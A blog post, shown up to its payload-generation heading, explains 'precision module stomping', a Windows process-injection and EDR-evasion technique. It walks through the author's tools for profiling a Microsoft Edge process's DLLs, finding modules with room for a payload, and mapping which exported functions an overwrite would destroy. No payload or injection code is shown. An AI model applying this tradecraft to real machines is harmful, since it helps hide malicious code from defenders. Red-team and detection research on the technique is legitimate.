# https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40toneillcodes%2Fadvanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40toneillcodes%2Fadvanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# Advanced Evasion Tradecraft: Precision Module Stomping

## Mapping process memory for calculated, stable execution

[![Tom O'Neill](https://miro.medium.com/v2/resize:fill:32:32/1*csbZCQnf74EEf36Ulms2sw.png)](https://medium.com/@toneillcodes?source=post_page---byline--b51feb0978fe---------------------------------------)

[Tom O'Neill](https://medium.com/@toneillcodes?source=post_page---byline--b51feb0978fe---------------------------------------)

Follow

19 min read

·

Jun 5, 2026

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Db51feb0978fe&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40toneillcodes%2Fadvanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe&source=---header_actions--b51feb0978fe---------------------post_audio_button------------------)

Share

## Background

### Context

In my [previous post](https://medium.com/bugbountywriteup/an-introduction-to-module-stomping-26238af76d43), I outlined the fundamental mechanics of module stomping. However, transforming this concept into reliable operational tradecraft demands rigorous environmental planning and custom tooling.

The most frequent failure point is treating module stomping as a universal plug-and-play primitive. Blindly targeting default libraries like `uxtheme.dll` or `comctl32.dll` without validating remote process states or payload size alignment is a recipe for a fast-fail exception. If the target module is missing or its `.text` section is too shallow, a crash is inevitable.

![](https://miro.medium.com/v2/resize:fit:612/1*B_MW_hIOUaziAg9Qm8msPw.png)

LOADER MITTONS

To circumvent these crashes, some operators rely on dynamically loading a “sacrificial DLL” to carve out fresh, predictable memory space.

However, forcing a process to suddenly map an unexpected library onto its disk-backed image layout is an incredibly noisy event. This specific behavioral pattern sits right at the top of modern EDR detection queues, trading a stability problem for a high-visibility detection problem.

The solution is a data-driven approach. By treating module selection as a multi-stage pipeline, you can achieve surgical precision and eliminate execution noise.

### Tools

All of the tools and code referenced in this post can be found in the ‘module-stomping’ folder in my ‘windows-process-injection’ repository.

[**GitHub - toneillcodes/windows-process-injection: A collection of techniques for process injection…** \\
\\
**A collection of techniques for process injection on Windows - toneillcodes/windows-process-injection**\\
\\
github.com](https://github.com/toneillcodes/windows-process-injection?source=post_page-----b51feb0978fe---------------------------------------)

## Targeted Module Stomping

### Workflow

- **Step One:** Identify the target process.
- **Step Two:** Profile the target process by generating a list of loaded modules with`list-process-dlls.exe`.
- **Step Three:** Build a payload that is tailored to operational goals. Note the total payload size, which will be needed in the following steps.
- **Step Four:** Run `find-stompable-dlls.py` to locate and filter modules that meet the payload size requirements. Identify a target module from the resulting list. AI can help summarize each module’s purpose for additional context.
- **Step Five:** Run `dump-exports.py` to find export names in the target module. Pick an export to target for the start of our buffer.
- **Step Six:** Run `blast-radius.py` to evaluate the structural impact of committing the total payload size to your chosen export pointer. This maps out every adjacent function that will be overwritten.

## Reconnaissance

### Profiling Process Modules

The first piece of information we need to collect is the list of modules that the target process loads.

We can use `list-process-dlls.exe` to connect to a process and list its modules. Keep in mind that this may not be all the modules the program uses, but rather a snapshot of what is currently loaded.

```
windows-process-injection\module-stomping>

Usage: list-process-dlls.exe [options]
Options:
  -p, --pid                  Target process ID.
  -n, --names-only           Only print out the raw DLL names (omit base addresses)
  -o, --output <filename>    Dump the inventory out to a text file
  -h, --help                 Show this help screen

windows-process-injection\module-stomping>
```

- The only required argument is the target PID (`-p` or `--pid`).
- The default behavior is to dump a list of all modules and their virtual address to the console.
- The `-n``--names-only` flag suppresses the virtual address and only outputs the module names.
- The `-o``--output` option writes the output to the specified file, in addition to the console.

Example output targeting Microsoft Edge:

```
windows-process-injection\module-stomping>list-process-dlls.exe -p 3896
[+] Enumerating loaded modules:
--------------------------------------------------
[0x00007FF6360C0000] msedge.exe
[0x00007FFDE4E80000] ntdll.dll
[0x00007FFDE41C0000] KERNEL32.DLL
[0x00007FFDE25B0000] KERNELBASE.dll
[0x00007FFDC4C10000] msedge_elf.dll
[0x00007FFDE3A40000] combase.dll
[0x00007FFDE2260000] ucrtbase.dll
[0x00007FFDE4C20000] RPCRT4.dll
[0x00007FFDE2100000] bcryptprimitives.dll
[0x00007FFDD4540000] version.dll
[0x00007FFDE3720000] msvcrt.dll
[0x00007FFDE3FA0000] ADVAPI32.dll
[0x00007FFDE3990000] sechost.dll
[0x00007FFDE2EA0000] SHELL32.dll
[0x00007FFDE21B0000] msvcp_win.dll
[0x00007FFDE3DD0000] USER32.dll
...
[0x00007FFDE12F0000] mswsock.dll
[0x00007FFDCB640000] psmachine_64.dll
[0x00007FFDD7080000] DSREG.DLL
[0x00007FFDD91F0000] wevtapi.dll
[0x00007FFDB8F50000] Windows.System.UserProfile.DiagnosticsSettings.dll
[0x00007FFDE06B0000] slc.dll
[0x00007FFDBFAC0000] SPPC.DLL
[0x00007FFDCAE60000] slwga.dll
[0x00007FFDDFC00000] WINNSI.DLL
[0x00007FFDD50F0000] webio.dll
[0x00007FFDE0CD0000] schannel.DLL
[0x00007FFDD0A60000] ncryptsslp.dll

windows-process-injection\module-stomping>
```

Re-running with module ‘names only’ and output to a file `c:\payloads\msedge-dlls.txt`

```
windows-process-injection\module-stomping>list-process-dlls.exe -p 3896 -n -o c:\payloads\msedge-dlls.txt
[+] Output will also be dumped to: c:\payloads\msedge-dlls.txt
[+] Enumerating loaded modules:
--------------------------------------------------
msedge.exe
ntdll.dll
KERNEL32.DLL
KERNELBASE.dll
msedge_elf.dll
combase.dll
...
windows-process-injection\module-stomping>
```

## Module Hunting

### Finding Stompable DLLs

Once we have a profile list, the second phase of analysis moves to the disk. We can scan system directories (such as `C:\Windows\System32`) to find DLLs that align with our requirements. The primary constraint is that the `.text` section must be large enough to host our payload. Beyond that, specific operational objectives will dictate whether we configure our filters to include or exclude currently loaded modules.

While parsing these directories manually would be daunting, we can use `find-stompable-dlls.py` to automate the verification loop quickly and efficiently.

```
windows-process-injection\module-stomping>python find-stompable-dlls.py
usage: find-stompable-dlls.py [-h] [-d DIR] [-m MIN_SIZE] [-x EXCLUDE] [-i INCLUDE] size

Find DLL candidates with targeted tracking and exclusion parameters.

positional arguments:
  size                  The total required size of the .text section (e.g., 0x80000)

options:
  -h, --help            show this help message and exit
  -d DIR, --dir DIR     Target directory to scan (default: C:\Windows\System32)
  -m MIN_SIZE, --min-size MIN_SIZE
                        Minimum file size on disk in MB (default: 1.0)
  -x EXCLUDE, --exclude EXCLUDE
                        Path to a text file containing specific DLLs to EXCLUDE
  -i INCLUDE, --include INCLUDE
                        Path to a text file containing specific DLLs to INCLUDE

windows-process-injection\module-stomping>
```

A total of 4 checks are completed to determine whether a DLL is a valid candidate.

- **Gate 1: Scope Filters (Inclusion / Exclusion)** Using the `parse_flat_file` helper, the script ingests simple, line-separated text files:
- **Inclusion (**`-i` **):** Limits the scan strictly to a targeted list of common Windows DLLs (e.g., if you only want to audit web-related or graphics modules).
- **Exclusion (**`-x` **):** Excludes specific modules. This may be to avoid stability issues or modules often monitored by behavioral heuristics.
- **Gate 2: File Size Verification** Filters out small binaries immediately using basic disk metrics (`os.path.getsize`) before parsing (defaulting to modules > 1.0 MB).
- **Gate 3: PE Structure Parsing** Leveraging the `pefile` library, the utility maps the binary's headers in `fast_load` mode. It iterates through the structure's `pe.sections` to isolate the executable code container: the `.text` **section**.
- **Gate 4: Capacity Analysis (**`Misc_VirtualSize` **)** This is the critical offensive metric. The script checks the section's `Misc_VirtualSize` (the actual size of the section when loaded into memory) against the user's payload size requirement passed via the CLI (which supports both decimal and hex values, such as `0x80000`).

If all 4 checks pass, the module information is output to the console/log as a potential candidate.

Example output searching `c:\windows\system32` for DLLs from the `msedge-dll.txt` list that can fit a `287930` byte payload yields 38 candidates:

```
windows-process-injection\module-stomping>python find-stompable-dlls.py -d c:\windows\System32 -i c:\payloads\msedge-dlls.txt 287930
[*] Loading INCLUDE_MODULES from: 'c:\payloads\msedge-dlls.txt'
[+] Loaded 138 modules into INCLUDE_MODULES filter.
[*] Scanning Target Directory: 'c:\windows\System32'
[*] Filtering for Files      : > 1.0MB
[*] Required .text Space     : 0x464ba bytes
[*] Targeted Include Filter  : Active (138 specific targets allowed)
--------------------------------------------------------------------------------------------------------------------------------------------
Full File Path                                                                        | File Size (MB)  | Size of .text   | Virtual Address
--------------------------------------------------------------------------------------------------------------------------------------------
c:\windows\System32\AppXDeploymentClient.dll                                          | 1.45            | 0xe89d0         | 0x1000
c:\windows\System32\combase.dll                                                       | 3.54            | 0x269ca2        | 0x1000
c:\windows\System32\CoreMessaging.dll                                                 | 1.17            | 0xd1175         | 0x1000
c:\windows\System32\CoreUIComponents.dll                                              | 2.89            | 0x19bf50        | 0x1000
c:\windows\System32\crypt32.dll                                                       | 1.46            | 0x124e7b        | 0x1000
c:\windows\System32\dnsapi.dll                                                        | 1.18            | 0xc64cc         | 0x1000
c:\windows\System32\dsreg.dll                                                         | 1.41            | 0xbd62c         | 0x1000
c:\windows\System32\DWrite.dll                                                        | 2.37            | 0x192c3c        | 0x1000
c:\windows\System32\gdi32full.dll                                                     | 1.18            | 0xb32bc         | 0x1000
c:\windows\System32\iertutil.dll                                                      | 2.79            | 0x89445         | 0x1000
c:\windows\System32\InputHost.dll                                                     | 1.91            | 0x154873        | 0x1000
c:\windows\System32\KernelBase.dll                                                    | 3.94            | 0x1a392f        | 0x1000
c:\windows\System32\msctf.dll                                                         | 1.38            | 0x114f70        | 0x1000
c:\windows\System32\ntdll.dll                                                         | 2.41            | 0x16ae9c        | 0x1000
c:\windows\System32\ole32.dll                                                         | 1.61            | 0xd5c4c         | 0x1000
c:\windows\System32\PCPKsp.dll                                                        | 1.10            | 0xc68e6         | 0x1000
c:\windows\System32\propsys.dll                                                       | 1.03            | 0xaa73e         | 0x1000
c:\windows\System32\rpcrt4.dll                                                        | 1.11            | 0xd3e99         | 0x1000
c:\windows\System32\setupapi.dll                                                      | 4.58            | 0xebc1e         | 0x1000
c:\windows\System32\shell32.dll                                                       | 7.37            | 0x5aa034        | 0x1000
c:\windows\System32\TextInputFramework.dll                                            | 1.30            | 0xf8d0c         | 0x1000
c:\windows\System32\twinapi.appcore.dll                                               | 2.28            | 0x196efa        | 0x1000
c:\windows\System32\ucrtbase.dll                                                      | 1.31            | 0xf5f61         | 0x1000
c:\windows\System32\user32.dll                                                        | 1.79            | 0xa7fee         | 0x1000
c:\windows\System32\Windows.Security.Authentication.Web.Core.dll                      | 1.21            | 0xe4f35         | 0x1000
c:\windows\System32\windows.storage.dll                                               | 8.43            | 0x64cc4e        | 0x1000
c:\windows\System32\Windows.System.Launcher.dll                                       | 1.49            | 0x113867        | 0x1000
c:\windows\System32\Windows.UI.dll                                                    | 1.34            | 0xcd5ac         | 0x1000
c:\windows\System32\Windows.UI.Immersive.dll                                          | 1.31            | 0xee404         | 0x1000
c:\windows\System32\winhttp.dll                                                       | 1.17            | 0xd742c         | 0x1000
c:\windows\System32\WinTypes.dll                                                      | 1.43            | 0xa1318         | 0x1000
c:\windows\System32\downlevel\ucrtbase.dll                                            | 1.31            | 0xf559c         | 0x1000
c:\windows\System32\Microsoft-Edge-WebView\ffmpeg.dll                                 | 2.94            | 0x25bebc        | 0x1000
c:\windows\System32\Microsoft-Edge-WebView\msedge.dll                                 | 287.75          | 0xeaf62f8       | 0x1000
c:\windows\System32\Microsoft-Edge-WebView\msedge_elf.dll                             | 3.88            | 0x303af5        | 0x1000
c:\windows\System32\Microsoft-Edge-WebView\oneauth.dll                                | 5.55            | 0x38d33e        | 0x1000
c:\windows\System32\Microsoft-Edge-WebView\oneds.dll                                  | 3.12            | 0x22aaab        | 0x1000
c:\windows\System32\Microsoft-Edge-WebView\telclient.dll                              | 2.50            | 0x1e4413        | 0x1000
--------------------------------------------------------------------------------------------------------------------------------------------
[*] Found 38 potential candidates matching the criteria.

windows-process-injection\module-stomping>
```

### Finding Target Functions

With a target module identified, using `dump-exports.py` we can parse the module to find out what functions are exported. We need to identify a target to overwrite with our buffer.

```
windows-process-injection\module-stomping>python dump-exports.py
usage: dump-exports.py [-h] -f FILE [-o OUTPUT] [--names-only]

Extract and map the complete Export Address Table layout from a target PE module.

options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  Path to the target DLL on disk.
  -o OUTPUT, --output OUTPUT
                        Optional path to a text file to write the output to.
  --names-only          Output a clean list of function names only, omitting headers, RVAs, and ordinals.

windows-process-injection\module-stomping>
```

Example output listing the exports from `c:\windows\System32\Microsoft-Edge-WebView\ffmpeg.dll`.

```
windows-process-injection\module-stomping>python dump-exports.py -f c:\windows\System32\Microsoft-Edge-WebView\ffmpeg.dll

===============================================================================================
📦 EXPORT ADDRESS TABLE MANIFEST: ffmpeg.dll
===============================================================================================
Exported Symbol / Function Name                         | Ordinal    | Relative Virtual Address (RVA)
-----------------------------------------------------------------------------------------------
avcodec_find_decoder                                    | 37         | 0x5ea90
avcodec_open2                                           | 41         | 0x61150
avcodec_flush_buffers                                   | 38         | 0x61700
avcodec_receive_frame                                   | 43         | 0x62090
avcodec_descriptor_get                                  | 35         | 0x62db0
avcodec_descriptor_next                                 | 36         | 0x62e30
avcodec_parameters_to_context                           | 42         | 0x63420
avcodec_send_packet                                     | 44         | 0x65670
avcodec_alloc_context3                                  | 34         | 0x16e760
avcodec_free_context                                    | 39         | 0x16e900
av_init_packet                                          | 16         | 0x16f410
av_packet_alloc                                         | 21         | 0x16f460
av_packet_free                                          | 23         | 0x16f4c0
...
av_dict_free                                            | 4          | 0x1bf6c0
av_strerror                                             | 32         | 0x1c0110
av_frame_alloc                                          | 8          | 0x1c35d0
av_frame_free                                           | 10         | 0x1c3660
av_frame_unref                                          | 11         | 0x1c3690
av_frame_clone                                          | 9          | 0x1c4740
av_log_set_level                                        | 17         | 0x1c5fc0
av_rescale_q                                            | 27         | 0x1c62f0
av_max_alloc                                            | 19         | 0x1c6740
av_malloc                                               | 18         | 0x1c6750
av_free                                                 | 12         | 0x1c6820
av_strdup                                               | 30         | 0x1c6a90
av_get_bytes_per_sample                                 | 13         | 0x1cc2b0
av_samples_get_buffer_size                              | 28         | 0x1cc2f0
-----------------------------------------------------------------------------------------------
[+] Successfully extracted 51 exports from the EAT.
===============================================================================================

windows-process-injection\module-stomping>
```

### Assessing Blast Radius

With a target module and function selected, we must evaluate our potential blast radius. In this scenario, the blast radius encompasses the functions immediately neighboring our target within the module layout.

Because functions are compiled sequentially in memory, writing a payload that exceeds the target function’s byte size will overflow its compilation bounds. The script walks the module’s function layout sequentially, mapping every adjacent function offset and symbol name within the payload’s total byte span. By analyzing this output, you can identify exactly which neighboring routines will be overwritten and destroyed, allowing you to predict process stability and ensure no critical system threads rely on the corrupted code sections.

## Get Tom O'Neill’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

To precisely map out this structural impact, we can leverage `blast-radius.py`. By supplying the target module file path, the specific export name, and the exact payload size, the script calculates the layout boundaries and provides immediate feedback on what code will be disrupted.

```
windows-process-injection\module-stomping>python blast-radius.py -h
usage: blast-radius.py [-h] -f FILE -fnc FUNCTION -s SIZE

Analyze the collateral damage/blast radius of a specific stomp payload.

options:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  Path to the target DLL.
  -fnc FUNCTION, --function FUNCTION
                        The export function to start stomping from.
  -s SIZE, --size SIZE  Size of your payload in bytes (can be int or hex string like 0x200).

windows-process-injection\module-stomping>
```

Example output indicates that targeting `ffmpeg.dll!avcodec_open2` with a payload of `286474` bytes will overwrite six additional functions:

```
windows-process-injection\module-stomping>python blast-radius.py -f c:\windows\System32\Microsoft-Edge-WebView\ffmpeg.dll -fnc avcodec_open2 -s 287930

==========================================================================================
💥 MODULE STOMP BLAST RADIUS ANALYSIS: ffmpeg.dll
==========================================================================================
Target Function       : avcodec_open2
Target Function RVA   : 0x61150
Your Payload Size     : 287930 bytes (0x464ba)
Isolated Exec Space   : 1456 bytes (0x5b0)
------------------------------------------------------------------------------------------
🔴 STATUS: [OVERFLOW RISK / COLLATERAL DAMAGE]
Your payload overflows the isolated function boundary by 286474 bytes.
Total adjacent exports completely or partially overwritten: 6

🚨 Overwritten Functions List:
  Offset From Target     | Function Name                                 | Start RVA
  -------------------------------------------------------------------------------------
  +1456                 | avcodec_flush_buffers                         | 0x61700
  +3904                 | avcodec_receive_frame                         | 0x62090
  +7264                 | avcodec_descriptor_get                        | 0x62db0
  +7392                 | avcodec_descriptor_next                       | 0x62e30
  +8912                 | avcodec_parameters_to_context                 | 0x63420
  +17696                | avcodec_send_packet                           | 0x65670
==========================================================================================

windows-process-injection\module-stomping>
```

If we had a smaller payload (ex: 256), the script would confirm that the payload would stay within the bounds of the target function without impacting other portions of the DLL:

```
windows-process-injection\module-stomping>python blast-radius.py -f c:\windows\System32\Microsoft-Edge-WebView\ffmpeg.dll -fnc avcodec_open2 -s 256

==========================================================================================
💥 MODULE STOMP BLAST RADIUS ANALYSIS: ffmpeg.dll
==========================================================================================
Target Function       : avcodec_open2
Target Function RVA   : 0x61150
Your Payload Size     : 256 bytes (0x100)
Isolated Exec Space   : 1456 bytes (0x5b0)
------------------------------------------------------------------------------------------
🟢 STATUS: [SAFE FIT]
Your payload fits entirely within the isolated boundary of avcodec_open2.
Zero adjacent exported functions will be modified.
==========================================================================================

windows-process-injection\module-stomping>
```

## Proof-of-Concept

### Step One: Identify Target Process

In this example, we’ll target Microsoft Edge to demonstrate some important considerations.

We can use PowerShell to identify the ‘msedge.exe’ processes, and we’ll target the main process by looking at the `ParentProcessId` column.

```
windows-process-injection\module-stomping > Get-CimInstance Win32_Process -Filter "Name='msedge.exe'" | Select-Object ProcessId, ParentProcessId, CommandLine

ProcessId ParentProcessId CommandLine
--------- --------------- -----------
     3896            5288 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
     6380            3896 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=crashpad-handler "--...
     5592            3896 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=gpu-process --gpu-pr...
     4492            3896 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-su...
     2388            3896 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-su...
     2420            3896 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --pdf-upsel...
     8108            3896 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --instant-p...
     5484            3896 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-su...
     9376            3896 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --pdf-upsel...

windows-process-injection\module-stomping >
```

### Step Two: Profile Target Process

The next step is to use `list-process-dlls.exe` to find out what modules the target process has loaded. Ideally, this would be done on a parity system to minimize noise on the target host.

- Pass the PID value to ‘`list-process-dlls.exe`’

```
windows-process-injection\module-stomping > .\list-process-dlls.exe -p 3896
[+] Enumerating loaded modules:
--------------------------------------------------
[0x00007FF6360C0000] msedge.exe
[0x00007FFDE4E80000] ntdll.dll
[0x00007FFDE41C0000] KERNEL32.DLL
[0x00007FFDE25B0000] KERNELBASE.dll
[0x00007FFDC4C10000] msedge_elf.dll
[0x00007FFDE3A40000] combase.dll
[0x00007FFDE2260000] ucrtbase.dll
[0x00007FFDE4C20000] RPCRT4.dll
[0x00007FFDE2100000] bcryptprimitives.dll
[0x00007FFDD4540000] version.dll
[0x00007FFDE3720000] msvcrt.dll
[0x00007FFDE3FA0000] ADVAPI32.dll
[0x00007FFDE3990000] sechost.dll
[0x00007FFDE2EA0000] SHELL32.dll
[0x00007FFDE21B0000] msvcp_win.dll
[0x00007FFDE3DD0000] USER32.dll
[0x00007FFDE29B0000] win32u.dll
[0x00007FFDE3600000] GDI32.dll
[0x00007FFDE1FD0000] gdi32full.dll
[0x00007FFDE23B0000] wintypes.dll
[0x00007FFDE4BD0000] IMM32.DLL
[0x00007FFDD9470000] windows.storage.dll
[0x00007FFDE4D40000] SHCORE.dll
[0x00007FFDE3630000] shlwapi.dll
[0x00007FFDE0EA0000] ntmarta.dll
[0x00007FFD94A10000] msedge.dll
[0x00007FFDCE870000] WINMM.dll
[0x00007FFDE1D80000] WINSTA.dll
[0x00007FFDE2D30000] MSCTF.dll
[0x00007FFDDFCC0000] uxtheme.dll
[0x00007FFDE4A20000] ole32.dll
[0x00007FFDE03F0000] kernel.appcore.dll
[0x00007FFDE4080000] clbcatq.dll
[0x00007FFDD03F0000] Windows.System.Profile.PlatformDiagnosticsAndUsageDataSettings.dll
[0x00007FFDCF810000] DiagnosticDataSettings.dll
[0x00007FFDCF7D0000] coreprivacysettingsstore.dll
[0x00007FFDE13A0000] USERENV.dll
[0x00007FFDE1360000] gpapi.dll
[0x00007FFDD8E50000] wkscli.dll
[0x00007FFDE08D0000] netutils.dll
[0x00007FFDE1E50000] powrprof.dll
[0x00007FFDE1E30000] UMPDC.dll
[0x00007FFDCF830000] Windows.ApplicationModel.dll
[0x00007FFDE3830000] OLEAUT32.dll
[0x00007FFDE1EC0000] bcrypt.dll
[0x00007FFDBC350000] CryptoWinRT.dll
[0x00007FFDDE440000] DWrite.dll
[0x00007FFDDA4B0000] twinapi.appcore.dll
[0x00007FFDE4140000] WS2_32.dll
[0x00007FFDCA1B0000] twinapi.dll
[0x00007FFDDB400000] XmlLite.dll
[0x00007FFDD4080000] COMCTL32.dll
[0x00007FFDE29E0000] CRYPT32.dll
[0x00007FFDE1BC0000] DPAPI.dll
[0x00007FFDE15D0000] CRYPTBASE.dll
[0x00007FFDC19B0000] nlansp_c.dll
[0x00007FFDE0910000] IPHLPAPI.DLL
[0x00007FFDE4BC0000] NSI.dll
[0x00007FFDDA230000] dhcpcsvc6.DLL
[0x00007FFDD8FA0000] dhcpcsvc.DLL
[0x00007FFDE0950000] DNSAPI.dll
[0x00007FFDD7300000] textinputframework.dll
[0x00007FFDDD2B0000] Windows.UI.dll
[0x00007FFDE1EF0000] profapi.dll
[0x00007FFDDF190000] WTSAPI32.dll
[0x00007FFDE1020000] SspiCli.dll
[0x00007FFDE1B10000] cfgmgr32.dll
[0x00007FFDD8C30000] mscms.dll
[0x00007FFDD9340000] WINHTTP.dll
[0x00007FFDC1B50000] oneauth.dll
[0x00007FFDD44F0000] Secur32.dll
[0x00007FFDDAE80000] Windows.UI.Immersive.dll
[0x00007FFDD3B30000] windows.staterepositorycore.dll
[0x00007FFDDF730000] policymanager.dll
[0x00007FFDDA700000] PROPSYS.dll
[0x00007FFDCFC80000] Windows.System.Launcher.dll
[0x00007FFDD5B30000] LINKINFO.dll
[0x00007FFDE0150000] dwmapi.dll
[0x00007FFDC8360000] dataexchange.dll
[0x00007FFDD7450000] InputHost.dll
[0x00007FFDDF600000] CoreMessaging.dll
[0x00007FFDC0470000] OLEACC.dll
[0x00007FFDD71F0000] directmanipulation.dll
[0x00007FFDDB880000] CoreUIComponents.dll
[0x00007FFDE1620000] MSASN1.dll
[0x00007FFDE15B0000] CRYPTSP.dll
[0x00007FFDE0E00000] rsaenh.dll
[0x00007FFDC8DE0000] Windows.Security.Authentication.Web.Core.dll
[0x00007FFDD9D70000] iertutil.dll
[0x00007FFDDA3A0000] srvcli.dll
[0x00007FFDCD230000] well_known_domains.dll
[0x00007FFDD0050000] domain_actions.dll
[0x00007FFDCFE40000] VCRUNTIME140.dll
[0x00007FFDCE150000] wofutil.dll
[0x00007FFDD5870000] OneCoreCommonProxyStub.dll
[0x00007FFDD5210000] OneCoreUAPCommonProxyStub.dll
[0x00007FFDE1CD0000] sxs.dll
[0x00007FFDBEEF0000] Windows.Internal.UI.Shell.WindowTabManager.dll
[0x00007FFDCD560000] clipc.dll
[0x00007FFDBF780000] ShellCommonCommonProxyStub.dll
[0x00007FFDE4540000] SETUPAPI.dll
[0x00007FFDE1B70000] DEVOBJ.dll
[0x00007FFDE2520000] WINTRUST.dll
[0x00007FFDDD410000] netprofm.dll
[0x00007FFD91880000] telclient.dll
[0x00007FFDA9630000] oneds.dll
[0x00007FFDA9E00000] ffmpeg.dll
[0x00007FFDE0770000] FirewallAPI.dll
[0x00007FFDE06E0000] fwbase.dll
[0x00007FFDCE6A0000] Geolocation.dll
[0x00007FFDCCCB0000] microsoft_shell_integration.dll
[0x00007FFDDFB00000] apphelp.dll
[0x00007FFDC6E70000] appresolver.dll
[0x00007FFDD1860000] windows.staterepositoryclient.dll
[0x00007FFDCAA20000] capauthz.dll
[0x00007FFDD6B30000] AppXDeploymentClient.dll
[0x00007FFDE42A0000] imagehlp.dll
[0x00007FFDCF050000] Windows.Networking.Connectivity.dll
[0x00007FFDD81C0000] npmproxy.dll
[0x00007FFDCF7B0000] NETAPI32.dll
[0x00007FFDD7060000] usermgrcli.dll
[0x00007FFDE17D0000] ncrypt.dll
[0x00007FFDE1780000] NTASN1.dll
[0x00007FFDC9140000] PCPKsp.dll
[0x00007FFDCD210000] tbs.dll
[0x00007FFDD0920000] ncryptprov.dll
[0x00007FFDE12F0000] mswsock.dll
[0x00007FFDCB640000] psmachine_64.dll
[0x00007FFDD7080000] DSREG.DLL
[0x00007FFDD91F0000] wevtapi.dll
[0x00007FFDB8F50000] Windows.System.UserProfile.DiagnosticsSettings.dll
[0x00007FFDE06B0000] slc.dll
[0x00007FFDBFAC0000] SPPC.DLL
[0x00007FFDCAE60000] slwga.dll
windows-process-injection\module-stomping >
```

- For this information to be useful, we need to write the module list to a file that we can then use in the next part of our recon process.
- This can be done by adding the `-n` and `-o` parameters and the result is a module list in `c:\payloads\msedge-module-recon.txt`.

```
windows-process-injection\module-stomping > .\list-process-dlls.exe -p 3896 -n -o c:\payloads\msedge-module-recon.txt
[+] Output will also be dumped to: c:\payloads\msedge-module-recon.txt
[+] Enumerating loaded modules:
--------------------------------------------------
msedge.exe
ntdll.dll
KERNEL32.DLL
KERNELBASE.dll
msedge_elf.dll
combase.dll
ucrtbase.dll
RPCRT4.dll
bcryptprimitives.dll
version.dll
msvcrt.dll
ADVAPI32.dll
sechost.dll
SHELL32.dll
msvcp_win.dll
USER32.dll
win32u.dll
GDI32.dll
gdi32full.dll
wintypes.dll
IMM32.DLL
windows.storage.dll
SHCORE.dll
shlwapi.dll
ntmarta.dll
msedge.dll
WINMM.dll
WINSTA.dll
MSCTF.dll
uxtheme.dll
ole32.dll
kernel.appcore.dll
clbcatq.dll
Windows.System.Profile.PlatformDiagnosticsAndUsageDataSettings.dll
DiagnosticDataSettings.dll
coreprivacysettingsstore.dll
USERENV.dll
gpapi.dll
wkscli.dll
netutils.dll
powrprof.dll
UMPDC.dll
Windows.ApplicationModel.dll
OLEAUT32.dll
bcrypt.dll
CryptoWinRT.dll
DWrite.dll
twinapi.appcore.dll
WS2_32.dll
twinapi.dll
XmlLite.dll
COMCTL32.dll
CRYPT32.dll
DPAPI.dll
CRYPTBASE.dll
nlansp_c.dll
IPHLPAPI.DLL
NSI.dll
dhcpcsvc6.DLL
dhcpcsvc.DLL
DNSAPI.dll
textinputframework.dll
Windows.UI.dll
profapi.dll
WTSAPI32.dll
SspiCli.dll
cfgmgr32.dll
mscms.dll
WINHTTP.dll
oneauth.dll
Secur32.dll
Windows.UI.Immersive.dll
windows.staterepositorycore.dll
policymanager.dll
PROPSYS.dll
Windows.System.Launcher.dll
LINKINFO.dll
dwmapi.dll
dataexchange.dll
InputHost.dll
CoreMessaging.dll
OLEACC.dll
directmanipulation.dll
CoreUIComponents.dll
MSASN1.dll
CRYPTSP.dll
rsaenh.dll
Windows.Security.Authentication.Web.Core.dll
iertutil.dll
srvcli.dll
well_known_domains.dll
domain_actions.dll
VCRUNTIME140.dll
wofutil.dll
OneCoreCommonProxyStub.dll
OneCoreUAPCommonProxyStub.dll
sxs.dll
Windows.Internal.UI.Shell.WindowTabManager.dll
clipc.dll
ShellCommonCommonProxyStub.dll
SETUPAPI.dll
DEVOBJ.dll
WINTRUST.dll
netprofm.dll
telclient.dll
oneds.dll
ffmpeg.dll
FirewallAPI.dll
fwbase.dll
Geolocation.dll
microsoft_shell_integration.dll
apphelp.dll
appresolver.dll
windows.staterepositoryclient.dll
capauthz.dll
AppXDeploymentClient.dll
imagehlp.dll
Windows.Networking.Connectivity.dll
npmproxy.dll
NETAPI32.dll
usermgrcli.dll
ncrypt.dll
NTASN1.dll
PCPKsp.dll
tbs.dll
ncryptprov.dll
mswsock.dll
psmachine_64.dll
DSREG.DLL
wevtapi.dll
Windows.System.UserProfile.DiagnosticsSettings.dll
slc.dll
SPPC.DLL
slwga.dll
windows-process-injection\module-stomping >
```

### Step Three: Generate a Payload

